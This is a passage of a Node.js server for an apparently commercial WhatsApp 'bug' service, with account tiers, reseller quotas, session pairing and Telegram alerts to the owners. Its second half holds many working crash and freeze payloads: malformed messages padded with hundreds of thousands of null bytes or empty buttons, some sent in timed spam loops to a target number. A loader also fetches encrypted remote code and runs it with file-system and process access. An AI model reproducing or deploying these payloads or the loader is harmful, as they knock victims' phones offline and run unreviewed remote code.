          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    let sendSuccess = false;
    try {
      sendSuccess = await attemptSend(sock);
    } catch (e) {
      console.error('[❌] Error during send attempt:', e.message || e);
      sendSuccess = false;
    }

    // Notify owners via Telegram about the send result
    try {
      const status = sendSuccess ? 'SUKSES' : 'EROR';
      const text = `PENGIRIMAN BUGS [${status}]\nUSERNAME:${sanitize(user.username)}\nTARGET:${sanitize(target || '')}\nJENIS BUG: ${sanitize(bug)}\nSENDER:${senderMode}`;
      sendTelegramOwners(text);
    } catch (e) {
      console.error('[❌ TELEGRAM NOTIF] Failed to notify owners about bug send:', e.message || e);
    }
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  const senders = Object.keys(activeConnections);
  const status = getGlobalSenderStatusPayload();
  res.json({ valid: true, senders, globalEnabled: status.enabled, message: status.message });
});

app.get("/getGlobalSenderStatus", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, enabled: false, message: 'Key tidak valid.' });

  const status = getGlobalSenderStatusPayload();
  const totalSender = Object.keys(activeConnections).length;
  res.json({ valid: true, enabled: status.enabled, message: status.message, totalSender });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "XORENGIN")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "admin", "moderator", "partner"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const roleLimits = {
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  sendAccountCreatedNotification({
    username: newUser,
    password: pass,
    role: newAccount.role,
    createdBy: creator.username,
    createdAt: new Date().toLocaleString('id-ID')
  });

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Hanya owner yang bisa menghapus role owner
  if (targetUser.role === 'owner' && deleter.role !== 'owner') {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner can delete another owner account." 
    });
  }

  const roleLevel = {
    owner: 6,
    moderator: 5,
    partner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Owner bisa hapus owner lain (level sama)
  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    sendAccountDeletedNotification({
      username: deletedUser.username,
      password: deletedUser.password || 'N/A',
      role: deletedUser.role || 'member',
      deletedBy: deleter.username,
      deletedAt: new Date().toLocaleString('id-ID')
    });

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !["owner", "moderator", "partner", "admin"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // HIERARKI ROLE - Owner BISA buat Owner
  const hierarchy = {
    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member', 'owner'], // ✅ Owner bisa buat owner
    moderator: ['admin', 'partner', 'reseller', 'vip', 'member'],
    partner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member']
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // ✅ Tidak ada pengecekan khusus untuk owner - Owner bebas buat owner lain

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  sendAccountCreatedNotification({
    username,
    password,
    role: newUser.role,
    createdBy: creator.username,
    createdAt: new Date().toLocaleString('id-ID')
  });

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["reseller", "admin", "partner", "moderator", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Owner bisa edit owner lain, hapus blok pengecekan khusus

  const roleLevel = {
    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  // Owner bisa edit owner lain (level sama)
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function rtrdelbnay(sock, target) {
  try {
    const suki = {
      groupStatusMessageV2: {
        message: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "../xuozif",
                  format: 1
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\u0000".repeat(990000),
                  wa_flow_response_params: {
                    title: " ".repeat(12000)
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, suki, {
      participant: { jid: target }
    });

  } catch (err) {
    console.log("Error", err);
  }
}

async function delachgyHard(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      contextInfo: {
        remoteJid: target, 
        forwardingScore: 999,
        isForwarded: true, 
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        }
      },
      body: { text: "ahah" }, 
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, { messageId: msg.key.id, onTarget: true });
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
             mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
             fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
             fileLength: "9999999999999",
             pageCount: 9999999999999,
             mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
             fileName: "crm.pdf",
             fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
             directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
             mediaKeyTimestamp: "1726867151",
             contactVcard: true,
             jpegThumbnail: ""
            }
          }, 
          body: { text: "native" }, 
          nativeFlowMessage: {
            buttons: Array.from({
              length: 500000
            }, () => ({}))
          }
        }
      }
    }
  }, { onTarget: true });
  const msgs = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "null", 
            format: "DEFAULT"
          }, 
          nativeFlowResponseMessage: {
            name: "address_message", 
            paramsJson: "\x10".repeat(1045000),
            version: 3
          }, 
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "$" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msgs.message
    }
  }, { onTarget: true, messageId: msgs.key.id });
}

async function Delayk7v(sock, target) {
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "k7pahina",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "",
                            version: 3
                        },
                        nativeFlowResponseMessage: {
                            name: "flow_message",
                            paramsJson: "",
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: Math.random().toString(36),
                            isForwarded: true,
                            forwardingScore: 9999,
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                                    participant: `62${z + 720599}@s.whatsapp.net`
                                }))
                            },
                        },
                    },
                },
            },
        }, { participant: { jid: target } });

        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "k7",
                            format: 3
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 150000 }, () => ({}))
                        }
                    }
                }
            }
        }, { participant: { jid: target } });

        await new Promise(r => setTimeout(r, 10));
    }
}

async function VnXDelayToCvghatLock(sock, target) {
  try {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "VnX" + "\n" },
            nativeFlowMessage: {
              messageParamsJson: "[".repeat(10000),
              buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
            }
          }
        }
      }
    }, { participant: { jid: target } });

    let vnxpush = [];
    for (let i = 0; i < 25; i++) {
      vnxpush.push({
        nativeFlowMessage: {
          messageParamsJson: "{[".repeat(10000),
          buttons: Array.from({ length: 150000 }, () => ({}))
        }
      });
    }

    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "VnX Is Here\n" },
        footer: { text: "By @BagasReall" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "Select Option",
                sections: [
                  {
                    title: "Menu",
                    rows: [
                      { title: "\n".repeat(25000), id: "opt1" },
                      { title: "\0".repeat(10000), id: "opt2" }
                    ]
                  }
                ]
              })
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "VnX Is Here" + "\0" + "\n" },
        footer: { text: "By @BagasReall" },
        nativeFlowMessage: {
          buttons: Array.from({ length: 500000 }, () => ({})),
          name: "cta_url",
          url: "t.me/BagasReall",
          display_text: "VnX Kayzen",
          messageParamsJson: "{[".repeat(10000)
        }
      }
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
      editedMessage: {
        conversation: "!-VnX - @BagasReall" + "\x10".repeat(250000) + "\n".repeat(250000)
      }
    }, { participant: { jid: target } });

  } catch (e) {
    console.log(e);
  }
}

async function FreezeXdelayInvvis(sock, target) { const message1 = { groupStatusMessageV2: { message: { interactiveMessage: { body: { text: "BS" }, nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }, contextInfo: { quotedMessage: { stickerPackMessage: {} } } } } } }; const message2 = { groupStatusMessageV2: { message: { interactiveResponseMessage: { body: { text: "BS", format: "DEFAULT" },nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "\u0003".repeat(2500000), version: 3 }, contextInfo: { urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 500000 }, (_, z) => ({ participant: `62${z + 720599}@s.whatsapp.net` })) } } } } } }; await sock.relayMessage(target, message1, { participant: { jid: target } }); await sock.relayMessage(target, message2, { participant: { jid: target } }); }

async function delayNew(sock, target) {
 try {
  const crm = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "exploit",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
         },
        },
      },
    },
  };
  await sock.relayMessage(target, crm);
  } catch (error) {
    console.error("error:", error);
  }
}

async function InteZnSyyCc(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?...",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_...",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            isAnimated: true,
            contextInfo: {
              mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")]
            }
          }
        }
      }
    }, {});
    
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "\u0000".repeat(590000) },
        nativeFlowMessage: {
          buttons: [
            {
              name: "catalog_message",
              buttonParamsJson: JSON.stringify({
                title: "𑇂𑆵𑆴𑆿".repeat(50000),
                description: "\u0000".repeat(300000),
                products: Array.from({ length: 300 }, (_, i) => ({
                  id: `prod_${i}`,
                  name: "𑇂".repeat(200000),
                  price: "Rp 999.999",
                  currency: "IDR",
                  image_url: "https://example.com/" + "\u0000".repeat(500000)
                })),
                catalog_id: "𑇂𑆵𑆴𑆿".repeat(500000)
              })
            }
          ]
        },
        contextInfo: { mentionedJid: [target] }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 100));
  }
}

async function ZnSycEwc(sock, target) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { text: "¡¿? XØRA ENGINE", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: { mentionedJid: [target] }
          }
        }
      }
    }, {});
    
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(500000),
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")]
            }
          }
        }
      }
    }, {});
    
    await new Promise(r => setTimeout(r, 100));
  }
}

async function delayxora(sock, target) {
  const whiletrue = {
    interactiveMessage: {
      body: {
        text: "VnX"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "\u0000".repeat(250000)
          },
          {
            name: "\n".repeat(250000)
          },
          {
            name: "\0".repeat(25000)
          },
          {
            name: "\x10".repeat(250000)
          }
        ]
      }
    }
  };

  const participant = {
    jid: target
  };

  await sock.relayMessage(
    target,
    whiletrue,
    {
      participant
    }
  );
}

async function spamdelayxora(sock, target) {
  const xuoziimut = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "../xuozif"
          },
          footer: { 
            text: "../xuozif"
          },
          nativeFlowMessage: {
            buttons: "\n".repeat(250000)
          }
        }
      }
    }
  }; 

  await sock.relayMessage(
    target,
    {
      protocolMessage: {
        type: 11
      },
      contextInfo: {
        forwardingScore: 9741,
        isForwarded: true,
        forwardedAIBotMessageInfo: {
          botName: "MetaAi",
          botJid: ["13135550202@s.whatsapp.net"],
          creatorName: "@mizukisnjii"
        }
      }
    }, 
    {
      participant: { jid: target }
    }
  );

  await sock.relayMessage(target, xuoziimut, { 
    participant: { jid: target } 
  });
}

async function invishard(sock, target, ptcp = true) {
    for (let r = 0; r < 1000; r++) {
        const payload = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "./bowombg",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
